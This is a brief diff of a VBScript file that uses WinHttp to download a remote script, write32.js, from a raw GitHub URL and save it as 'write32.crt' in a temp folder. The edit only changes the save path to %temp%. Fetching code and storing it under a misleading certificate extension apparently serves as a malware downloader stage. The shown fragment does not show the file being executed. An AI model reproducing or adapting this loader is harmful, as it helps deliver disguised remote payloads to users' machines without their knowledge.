@@ -4,7 +4,7 @@ Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
 URL = "https://raw.githubusercontent.com/kaitlyn93/Grandcoffee/main/js/scripts/write32.js"
 objWinHttp.open "GET", URL, False
 objWinHttp.send ""
-SaveBinaryData "C:\Windows\Temp\write32\write32.crt",objWinHttp.responseBody
+SaveBinaryData "%temp%\write32\write32.crt",objWinHttp.responseBody
 Function SaveBinaryData(FileName, Data)
 	Const adTypeText = 1
 	Const adSaveCreateOverWrite = 2
